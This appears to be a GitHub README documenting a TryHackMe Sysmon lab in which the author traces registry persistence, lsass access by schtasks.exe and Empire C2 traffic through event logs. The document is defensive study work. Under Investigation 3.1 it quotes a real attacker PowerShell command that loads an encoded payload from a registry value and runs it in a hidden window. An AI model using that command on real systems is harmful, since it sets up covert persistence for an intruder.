# -Advanced-Threat-Hunting-with-Sysmon-PowerShell-Part-2

**🧠 Summary / What It Does**

This phase continues my hands-on forensic analysis using Sysmon and PowerShell, diving deeper into registry-based payloads, process access analysis, and adversary network communication.
Through real-world investigation data, I correlated event logs (IDs 3, 10, 13) to uncover persistence, lateral movement, and command-and-control (C2) behaviour — the kind that slips past surface-level monitoring.

**⚙️ Tools & Tech**

🪟 Windows PowerShell — advanced event filtering and log parsing

🧩 Sysmon (System Monitor) — tracking process, registry, and network activity

🧠 Event Viewer / EVTX Log Analysis — visual validation of suspicious events

🧰 Windows Registry — persistence detection

💻 TryHackMe: Sysmon Room — simulated enterprise SOC scenario

**🗂️ Features**
✅ Detection of suspicious registry-based payloads
✅ Analysis of process access (Event ID 10) — privilege misuse and credential theft attempts
✅ Mapping of network traffic to adversary C2 servers
✅ Identification of encoded PowerShell persistence mechanisms
✅ Reinforcement of threat-hunting logic via multi-event correlation

**🧩 Investigation Walkthrough
🕵🏽‍♂️ Investigation 3.1 – Registry-Based Payload & Persistence**

Registry Payload Storage:
HKLM\SOFTWARE\Microsoft\Network\debug

PowerShell Launch Code:
"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -c "$x=$((gp HKLM:Software\Microsoft\Network debug).debug);start -Win Hidden -A \"-enc $x\" powershell";exit;"

C2 Hostname:
empirec2

**🖼️ Screenshots (Evidence)**

<img width="1816" height="156" alt="Sysmon Project Question 11 " src="https://github.com/user-attachments/assets/22b94adf-2628-4502-84c2-49a2345b1698" />

<img width="778" height="630" alt="Sysmon Project Answer 11 " src="https://github.com/user-attachments/assets/66e0c010-1048-47e9-842a-47bb80c5217c" />

**🔍 Investigation 3.2 – Payload Execution, Network Activity & Process Access**

Payload File Path:
c:\users\q\AppData:blah.txt

Adversary IP:
172.168.103.188

Suspicious Process Behaviour:
schtasks.exe accessing lsass.exe (Event ID 10 – Credential theft indicator)

**🖼️ Screenshots (Evidence)**

<img width="1812" height="326" alt="Sysmon Project Question 12 and 13  " src="https://github.com/user-attachments/assets/18dd86cf-0589-49ce-9c2e-b557324e946b" />

<img width="833" height="393" alt="Sysmon Project Answer 12 " src="https://github.com/user-attachments/assets/e2a78273-7339-4735-896f-b4c72eb62b8d" />

<img width="1881" height="473" alt="Sysmon Project Answer 13 " src="https://github.com/user-attachments/assets/eefe70ef-b697-4084-85e2-178b62936a8e" />

<img width="1856" height="204" alt="Sysmon Project Question 14 " src="https://github.com/user-attachments/assets/f7a1ab1a-68e7-4b76-a02a-c5964b28a5e9" />

<img width="1902" height="765" alt="Sysmon Project Answer 14 " src="https://github.com/user-attachments/assets/83f6e06c-8ac8-4796-b15f-f2bc97d5551e" />

<img width="1825" height="173" alt="Sysmon Project Question 15 " src="https://github.com/user-attachments/assets/08daf53a-4aed-45de-80c2-edb4ba05042c" />

<img width="1126" height="548" alt="Sysmon Project Answer 15 " src="https://github.com/user-attachments/assets/66f33a78-3e4a-4234-965f-7975586a925a" />

Event Viewer (lsass.exe accessed by schtasks.exe):

**🌐 Investigation 4 – Network Communication and Empire C2 Identification**

Adversary IP:
172.30.1.253

Port in Use:
80

C2 Framework:
Empire

**🖼️ Screenshots (Evidence)**

<img width="1812" height="172" alt="Sysmon Project Question 17 " src="https://github.com/user-attachments/assets/8b8d6614-4721-419d-991d-f6f2bc3ef35a" />

<img width="1920" height="766" alt="Sysmon Project Answer 17 " src="https://github.com/user-attachments/assets/1bf2f1d4-75af-4e5a-98d4-ad06e9417c4e" />

<img width="1817" height="486" alt="Sysmon Project Quetsions 18 19 20  " src="https://github.com/user-attachments/assets/82141bfc-79ad-4de1-9a1d-0d98b8a6240d" />

<img width="1888" height="579" alt="Sysmon Project Answer 18 19 20  " src="https://github.com/user-attachments/assets/459ed324-1ce0-41e6-afbf-841181c5dd67" />


**✅ What I Learned**

How to correlate multiple Sysmon event types for full attack-chain visibility

How attackers can abuse scheduled tasks and PowerShell for persistence and credential access

The role of Sysmon Event IDs (3, 10, 13) in tracing endpoint compromise

Strengthened my SOC investigation workflow, improving pivoting between PowerShell, Sysmon logs, and registry artefacts

**📚 Resources**

Microsoft Sysmon Documentation

TryHackMe – Sysmon Room

PowerShell Get-WinEvent Reference

**🙌 Credits / Acknowledgements**

Massive thanks to TryHackMe for the investigation scenarios and Sysinternals for Sysmon — a defender’s best friend when it comes to visibility and telemetry.

This project showcases real-world endpoint forensics and how detailed event logs can expose stealthy attacker behaviour.
Part 2 highlights the bridge between registry persistence, PowerShell abuse, and C2 activity tracking.

